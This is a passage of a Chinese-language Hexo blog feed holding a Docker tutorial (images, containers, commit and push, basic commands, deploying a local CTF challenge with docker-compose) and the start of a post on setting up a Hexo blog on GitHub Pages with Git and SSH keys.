href="#第4步-使用Docker镜像" class="headerlink" title="第4步 - 使用Docker镜像"></a><strong>第4步 - 使用Docker镜像</strong></h2><p>Docker容器是从Docker镜像构建的。默认情况下，Docker从<a href="https://hub.docker.com/">Docker Hub</a>中提取这些镜像，这是一个由Docker管理的Docker镜像市场，这是Docker项目背后的公司。任何人都可以在Docker Hub上托管他们的Docker镜像，所以您只需要将您的应用程序和Linux放在那边托管即可。</p><p>要检查您是否可以从Docker Hub访问和下载镜像，请输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>输出下面的内容则Docker正常工作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Unable to find image <span class="string">&#x27;hello-world:latest&#x27;</span> locally</span><br><span class="line"><span class="attr">latest</span>: Pulling <span class="keyword">from</span> library/hello-world</span><br><span class="line">9bb5a5d4561a: Pull complete</span><br><span class="line"><span class="attr">Digest</span>: sha256:3e1764d0f546ceac4565547df2ac4907fe46f007ea229fd7ef2718514bcec35d</span><br><span class="line"><span class="attr">Status</span>: Downloaded newer image <span class="keyword">for</span> hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello <span class="keyword">from</span> Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Docker最初无法在本地找到<code>hello-world</code>镜像，因此它从Docker Hub下载了镜像，Docker Hub是默认存储库。下载映像后，Docker从映像创建了一个容器，并在容器中执行了应用程序，显示了该消息。</p><p>您可以使用<code>docker</code>带子命令的<code>search</code>命令搜索Docker Hub上可用的镜像。例如，要搜索Ubuntu映像，请输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search ubuntu</span><br></pre></td></tr></table></figure><p>该脚本将对Docker Hub进行抓取，并返回名称与搜索字符串匹配的所有镜像的列表。输出将类似于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">NAME                                                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">ubuntu                                                    Ubuntu is a Debian-based Linux operating sys…   <span class="number">7917</span>                [OK]</span><br><span class="line">dorowu/ubuntu-desktop-lxde-vnc                            Ubuntu <span class="keyword">with</span> openssh-server and NoVNC            <span class="number">193</span>                                     [OK]</span><br><span class="line">rastasheep/ubuntu-sshd                                    Dockerized SSH service, built on top <span class="keyword">of</span> offi…   <span class="number">156</span>                                     [OK]</span><br><span class="line">ansible/ubuntu14<span class="number">.04</span>-ansible                               Ubuntu <span class="number">14.04</span> LTS <span class="keyword">with</span> ansible                   <span class="number">93</span>                                      [OK]</span><br><span class="line">ubuntu-upstart                                            Upstart is an event-based replacement <span class="keyword">for</span> th…   <span class="number">87</span>                  [OK]</span><br><span class="line">neurodebian                                               NeuroDebian provides neuroscience research s…   <span class="number">50</span>                  [OK]</span><br><span class="line">ubuntu-debootstrap                                        debootstrap --variant=minbase --components=m…   <span class="number">38</span>                  [OK]</span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-nginx-php-phpmyadmin-mysql-<span class="number">5</span>      ubuntu-<span class="number">16</span>-nginx-php-phpmyadmin-mysql-<span class="number">5</span>          <span class="number">36</span>                                      [OK]</span><br><span class="line">nuagebec/ubuntu                                           Simple always updated Ubuntu docker images w…   <span class="number">23</span>                                      [OK]</span><br><span class="line">tutum/ubuntu                                              Simple Ubuntu docker images <span class="keyword">with</span> SSH access     <span class="number">18</span></span><br><span class="line">i386/ubuntu                                               Ubuntu is a Debian-based Linux operating sys…   <span class="number">13</span></span><br><span class="line">ppc64le/ubuntu                                            Ubuntu is a Debian-based Linux operating sys…   <span class="number">12</span></span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-apache-php-<span class="number">7.0</span>                    ubuntu-<span class="number">16</span>-apache-php-<span class="number">7.0</span>                        <span class="number">10</span>                                      [OK]</span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-nginx-php-phpmyadmin-mariadb-<span class="number">10</span>   ubuntu-<span class="number">16</span>-nginx-php-phpmyadmin-mariadb-<span class="number">10</span>       <span class="number">6</span>                                       [OK]</span><br><span class="line">eclipse/ubuntu_jdk8                                       Ubuntu, JDK8, Maven <span class="number">3</span>, git, curl, nmap, mc, …   <span class="number">6</span>                                       [OK]</span><br><span class="line">codenvy/ubuntu_jdk8                                       Ubuntu, JDK8, Maven <span class="number">3</span>, git, curl, nmap, mc, …   <span class="number">4</span>                                       [OK]</span><br><span class="line">darksheer/ubuntu                                          Base Ubuntu Image -- Updated hourly             <span class="number">4</span>                                       [OK]</span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-apache                            ubuntu-<span class="number">16</span>-apache                                <span class="number">3</span>                                       [OK]</span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-nginx-php-<span class="number">5.6</span>-wordpress-<span class="number">4</span>         ubuntu-<span class="number">16</span>-nginx-php-<span class="number">5.6</span>-wordpress-<span class="number">4</span>             <span class="number">3</span>                                       [OK]</span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-sshd                              ubuntu-<span class="number">16</span>-sshd                                  <span class="number">1</span>                                       [OK]</span><br><span class="line">pivotaldata/ubuntu                                        A quick freshening-up <span class="keyword">of</span> the base Ubuntu doc…   <span class="number">1</span></span><br><span class="line">1and1internet/ubuntu-<span class="number">16</span>-healthcheck                       ubuntu-<span class="number">16</span>-healthcheck                           <span class="number">0</span>                                       [OK]</span><br><span class="line">pivotaldata/ubuntu-gpdb-dev                               Ubuntu images <span class="keyword">for</span> GPDB development              <span class="number">0</span></span><br><span class="line">smartentry/ubuntu                                         ubuntu <span class="keyword">with</span> smartentry                          <span class="number">0</span>                                       [OK]</span><br><span class="line">ossobv/ubuntu</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在<strong>OFFICIAL</strong>列中，带<strong>OK</strong>标记的表明这个镜像由公司构建和支持。其他镜像则由个人创建。确定要使用的映像后，可以使用命令<code>pull</code>将其下载到计算机。</p><p>执行以下<code>ubuntu</code>命令将官方映像下载到您的计算机：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure><p>您将看到以下输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Using <span class="keyword">default</span> tag: latest</span><br><span class="line"><span class="attr">latest</span>: Pulling <span class="keyword">from</span> library/ubuntu</span><br><span class="line">6b98dfc16071: Pull complete</span><br><span class="line">4001a1209541: Pull complete</span><br><span class="line">6319fc68c576: Pull complete</span><br><span class="line"><span class="attr">b24603670dc3</span>: Pull complete</span><br><span class="line">97f170c87c6f: Pull complete</span><br><span class="line"><span class="attr">Digest</span>: sha256:5f4bdc3467537cbbe563e80db2c3ec95d548a9145d64453b06939c4592d67b6d</span><br><span class="line"><span class="attr">Status</span>: Downloaded newer image <span class="keyword">for</span> ubuntu:latest</span><br></pre></td></tr></table></figure><p>下载映像后，可以使用子命令<code>run</code>运行容器。正如示例中那样，如果在使用子命令docker执行时未下载<code>hello-world</code>镜像，则Docker客户端将首先下载镜像，然后使用<code>run</code>运行容器。</p><p>要查看已下载到计算机的镜像，请输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>输出类似于以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              113a43faa138        <span class="number">4</span> weeks ago         <span class="number">81.</span>2MB</span><br><span class="line">hello-world         latest              e38bc07ac18e        <span class="number">2</span> months ago        <span class="number">1.</span>85kB</span><br></pre></td></tr></table></figure><p>正如您将在本教程后面看到的那样，用于运行容器的镜像可以被修改并用于生成新镜像，然后可以将其上传到Docker Hub或其他Docker镜像托管网站。</p><p>我们来看看如何更详细地运行容器。</p><h2 id="第5步-运行Docker容器"><a href="#第5步-运行Docker容器" class="headerlink" title="第5步 - 运行Docker容器"></a><strong>第5步 - 运行Docker容器</strong></h2><p>在您在上一步中<code>hello-world</code>容器是运行并发出一个测试消息之后退出容器。容器可以比这更有用，它们可以是交互式的。毕竟，它们类似于虚拟机，只是更加有利于资源。</p><p>举个例子，让我们使用Ubuntu的最新镜像运行一个容器。**-i<strong>和</strong>-t**子命令的意思为您提供了对容器的交互式shell访问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu</span><br></pre></td></tr></table></figure><p>现在，您应该已经进入docker内部，在这个环境下，您的shell展现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@d9b100f2f636:/#</span><br></pre></td></tr></table></figure><p>请注命令提示符中的容器ID。在例子中它是<code>d9b100f2f636</code>，稍后您需要该容器ID以在要删除容器时标识容器。现在您可以在容器内运行任何命令。例如，让我们更新容器内的包数据库。您不需要<code>sudo</code>命令添加前缀，因为您以<strong>root</strong>用户身份在容器内操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><p>然后在其中安装任何应用程序。我们安装Node.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install nodejs</span><br></pre></td></tr></table></figure><p>这将从官方Ubuntu存储库中安装容器中的Node.js. 安装完成后，验证是否已安装Node.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>您将看到终端中显示的版本号：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8<span class="number">.10</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>您在容器内进行的任何更改仅适用于该容器。要退出容器，请输入<code>exit</code>退出。</p><p>让我们看看下一步管理我们系统上的容器。</p><h2 id="第6步-管理Docker容器"><a href="#第6步-管理Docker容器" class="headerlink" title="第6步 - 管理Docker容器"></a><strong>第6步 - 管理Docker容器</strong></h2><p>使用Docker一段时间后，您的计算机上将有许多运行和非运行容器。要查看<strong>运行的</strong>，请使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>您将看到类似于以下内容的输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             </span><br></pre></td></tr></table></figure><p>在本教程中，您启动了两个容器。一个来自<code>hello-world</code>镜像，另一个来自<code>ubuntu</code>镜像。两个容器都不再运行，但它们仍然存在于您的系统上。</p><p>要查看所有容器的运行状态，请使用<code>docker ps</code>命令加指令<code>-a</code>运行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>您将看到类似于此的输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d9b100f2f636        ubuntu              <span class="string">&quot;/bin/bash&quot;</span>         About an hour ago   Exited (<span class="number">0</span>) <span class="number">8</span> minutes ago                           sharp_volhard</span><br><span class="line">01c950718166        hello-world         <span class="string">&quot;/hello&quot;</span>            About an hour ago   Exited (<span class="number">0</span>) About an hour ago                       festive_williams</span><br></pre></td></tr></table></figure><p>要查看您创建的最新容器，请使用<code>-l</code>命令：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -l</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES</span><br><span class="line">d9b100f2f636        ubuntu              <span class="string">&quot;/bin/bash&quot;</span>         About an hour ago   Exited (<span class="number">0</span>) <span class="number">10</span> minutes ago                       sharp_volhard</span><br></pre></td></tr></table></figure><p>要启动已停止的容器，请使用<code>docker start</code>，后跟容器ID<code>d9b100f2f636</code>。让我们启动基于Ubuntu的容器，命令如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start d9b100f2f636</span><br></pre></td></tr></table></figure><p>容器将启动，您可以使用docker ps来查看其状态：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">d9b100f2f636        ubuntu              <span class="string">&quot;/bin/bash&quot;</span>         About an hour ago   Up <span class="number">8</span> seconds                            sharp_volhard</span><br></pre></td></tr></table></figure><p>要停止正在运行的容器，请使用<code>docker stop</code>，后跟容器ID或名称<code>sharp_volhard</code>。这次，我们将使用Docker分配容器的名称，即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop sharp_volhard</span><br></pre></td></tr></table></figure><p>一旦您决定不再需要容器，请使用<code>docker rm</code>命令将其删除。使用该<code>docker ps -a</code>命令查找与映像<code>hello-world</code>关联的容器的容器，然后将其删除。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm festive_williams</span><br></pre></td></tr></table></figure><p>您可以使用开关启动一个新容器并为其命名–name。您还可以使用该开关创建一个在停止时自行删除的容器–rm。有关这些选项和其他选项的更多信息，请参阅<code>docker run help</code>命令。</p><p>容器可以转换为可用于构建新容器的映像。让我们来看看它是如何工作的。</p><h2 id="步骤7-将容器中的更改提交到Docker镜像"><a href="#步骤7-将容器中的更改提交到Docker镜像" class="headerlink" title="步骤7 - 将容器中的更改提交到Docker镜像"></a><strong>步骤7 - 将容器中的更改提交到Docker镜像</strong></h2><p>当您启动Docker镜像时，您可以像使用虚拟机一样创建，修改和删除文件。您所做的更改仅适用于该容器。您可以启动和停止它，但是一旦使用<code>docker rm</code>命令销毁它，更改将永久丢失。本节介绍如何将容器的状态保存为新的Docker镜像。</p><p>在Ubuntu容器中安装Node.js后，您现在有一个运行镜像的容器，但容器与您用来创建它的镜像不同。但是您可能希望稍后重新使用此容器作为新映像。</p><p>然后使用以下命令将更改提交到新的Docker镜像实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m <span class="string">&quot;What you did to the image&quot;</span> -a <span class="string">&quot;Author Name&quot;</span> container_id repository/new_image_name</span><br></pre></td></tr></table></figure><p>该**-m<strong>是提交信息，可以帮助你和其他人知道你所做的修改，而</strong>-a**用于指定作者。当您启动交互式Docker会话时，这是您在本教程前面提到的那个<code>container_id</code>。除非您在Docker Hub上创建了其他repository存储库，否则通常是您的Docker Hub用户名。</p><p>例如，对于用户<strong>sammy</strong>，使用容器ID：d9b100f2f636 ，命令将是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m <span class="string">&quot;added Node.js&quot;</span> -a <span class="string">&quot;sammy&quot;</span> d9b100f2f636 sammy/ubuntu-nodejs</span><br></pre></td></tr></table></figure><p>当你提交镜像后，新的镜像在您的计算机上本地保存。在本教程的后面，您将学习如何将映像推送到<code>Docker Hub</code>之类的Docker镜像市场，以便其他人可以访问它。</p><p>再次列出Docker镜像将显示旧镜像以及从中衍生的新镜像：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>你会看到这样的输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY               TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">sammy/ubuntu-nodejs   latest              7c1f35226ca6        <span class="number">7</span> seconds ago       179MB</span><br><span class="line">ubuntu                   latest              113a43faa138        <span class="number">4</span> weeks ago         <span class="number">81.</span>2MB</span><br><span class="line">hello-world              latest              e38bc07ac18e        <span class="number">2</span> months ago        <span class="number">1.</span>85kB</span><br></pre></td></tr></table></figure><p>在此示例中，是新镜像<code>ubuntu-nodejs</code>，它是从Docker Hub的<code>ubuntu</code>现有镜像衍生的。镜像大小差异反映了所做的变化。因此，下次需要使用预先安装了NodeJS的Ubuntu运行容器时，您可以使用新映像<code>ubuntu-nodejs</code>。</p><p>您还可以从<code>Dockerfile</code>构建映像，这样可以在新映像中自动安装软件。但是，这超出了本教程的范围。</p><p>现在让我们与他人分享新镜像，以便他们可以从中创建容器。</p><h2 id="步骤8-将Docker镜像推送到Docker存储库"><a href="#步骤8-将Docker镜像推送到Docker存储库" class="headerlink" title="步骤8 - 将Docker镜像推送到Docker存储库"></a><strong>步骤8 - 将Docker镜像推送到Docker存储库</strong></h2><p>从现有映像创建新映像之后的下一个步骤是与您几个朋友分享，Docker Hub上的镜像全世界都可以访问，不过你先要安装注册Docker Hub地址才行。</p><p>本节介绍如何将Docker镜像推送到Docker Hub，要推送镜像，请先登录Docker Hub。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u docker-registry-username</span><br></pre></td></tr></table></figure><p>系统将提示您使用Docker Hub密码进行身份验证。然后你可以使用以下方法推送自己的镜像</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push docker-registry-username/docker-image-name</span><br></pre></td></tr></table></figure><p>要将<code>ubuntu-nodejs</code>镜像推送到<strong>sammy</strong>存储库，命令是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push sammy/ubuntu-nodejs</span><br></pre></td></tr></table></figure><p>上传镜像时，该过程可能需要一些时间才能完成，完成后，输出将如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">The push refers to a repository [docker.io/sammy/ubuntu-nodejs]</span><br><span class="line"><span class="attr">e3fbbfb44187</span>: Pushed</span><br><span class="line">5f70bf18a086: Pushed</span><br><span class="line"><span class="attr">a3b5c80a4eba</span>: Pushed</span><br><span class="line">7f18b442972b: Pushed</span><br><span class="line">3ce512daaf78: Pushed</span><br><span class="line">7aae4540b42d: Pushed</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>将镜像推送到注册表后，它应该列在您帐户的控制台上，如下图所示。</p><p><img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/1620.png" alt="img"></p><p>如果推送尝试导致此类错误，那么您可能没有登录：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">The push refers to a repository [docker.io/sammy/ubuntu-nodejs]</span><br><span class="line"><span class="attr">e3fbbfb44187</span>: Preparing</span><br><span class="line">5f70bf18a086: Preparing</span><br><span class="line"><span class="attr">a3b5c80a4eba</span>: Preparing</span><br><span class="line">7f18b442972b: Preparing</span><br><span class="line">3ce512daaf78: Preparing</span><br><span class="line">7aae4540b42d: Waiting</span><br><span class="line"><span class="attr">unauthorized</span>: authentication required</span><br></pre></td></tr></table></figure><p>登录docker login并尝试重复推送。然后验证是否存在于Docker Hub存储库页面上。</p><p>您现在可以使用<code>docker pull sammy/ubuntu-node&lt;^&gt;</code>将镜像拉取到新计算机并使用它来运行新容器。</p><h2 id="docker的基本命令"><a href="#docker的基本命令" class="headerlink" title="docker的基本命令"></a><strong>docker的基本命令</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动docker</span></span><br><span class="line">sudo service docker start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止docker</span></span><br><span class="line">sudo service docker stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启docker</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出镜像</span></span><br><span class="line">docker image ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 拉取镜像</span></span><br><span class="line">docker image pull library/hello-world</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除镜像</span></span><br><span class="line">docker image rm 镜像id/镜像ID</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建容器</span></span><br><span class="line">docker run [选项参数] 镜像名 [命令]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止一个已经在运行的容器</span></span><br><span class="line">docker container stop 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动一个已经停止的容器</span></span><br><span class="line">docker container start 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉一个已经在运行的容器</span></span><br><span class="line">docker container kill 容器名或容器id</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器</span></span><br><span class="line">docker container rm 容器名或容器id</span><br></pre></td></tr></table></figure><p><strong>校赛复现示例</strong>：</p><p>在第五步完成后操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220110231817050.png" alt="image-20220110231817050" style="zoom:33%;"><p>打开其中的web在虚拟机里创建一个文件夹，把这些文件放进去。<img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220110232241002.png" alt="image-20220110232241002" style="zoom:33%;"></p><p>打开yml文件，把容器名字改一下，把80：80改成10001：80</p><p>在这个页面打开终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">docker ps</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220111223510229.png" alt="image-20220111223510229" style="zoom:25%;"><p>之后访问：</p><p>类似<img src="/2022/01/07/Ubuntu-Docker%E5%AE%89%E8%A3%85/image-20220111141906536.png" alt="image-20220111141906536" style="zoom:33%;">这个地址+ <code>：10001（根据题目更改）</code></p><p>: )</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo+github搭建博客</title>
      <link href="/2022/01/06/%E5%88%A9%E7%94%A8hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/01/06/%E5%88%A9%E7%94%A8hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>1.安装Node.js</strong> </p><p>安装选项全部默认，一路点击<code>Next</code>。</p><p>最后安装好之后，按<code>Win+R</code>打开命令提示符，</p><p>输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，那么就安装成功了。</p><p><strong>2.安装Git</strong></p><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git</p><p>安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开git了。</p><p>安装完成后在命令提示符中输入<code>git --version</code>验证是否安装成功。</p><p><strong>3.安装hexo</strong></p><p>在合适的地方新建一个文件夹，用来存放自己的博客文件。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。</p><p>定位到该目录下，输入<code>npm i hexo-cli -g</code>安装Hexo。会有几个报错，无视它就行。</p><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>然后就要初始化我们的网站，输入<code>hexo init</code>初始化文件夹，接着输入<code>npm install</code>安装必备的组件。</p><p>这样本地的网站配置也弄好啦，输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器，然后浏览器打开<a href="https://link.zhihu.com/?target=http://localhost:4000/">http://localhost:4000/</a>。出现Hexo默认页面，安装完成。</p><p><strong>4.连接Github与本地</strong></p><p>首先右键打开git bash，然后输入下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后生成密钥SSH key：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>打开<a href="https://link.zhihu.com/?target=http://github.com/">github</a>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个SSH，名字随便。</p><p>git bash中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>将输出的内容复制到框中，点击确定保存。</p><p>输入<code>ssh -T git@github.com</code></p><p>首先安装 hexo-deployer-git：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后修改*_config.yml* 文件末尾的 Deployment 部分，修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>完成后运行 <code>hexo d</code> 将网站上传部署到 GitHub Pages。</p><p>完成！这时访问我们的 GitHub 域名 <code>https://用户名.github.io</code> 就可以看到 Hexo 网站了。</p><p>[参考知乎教程1](<a 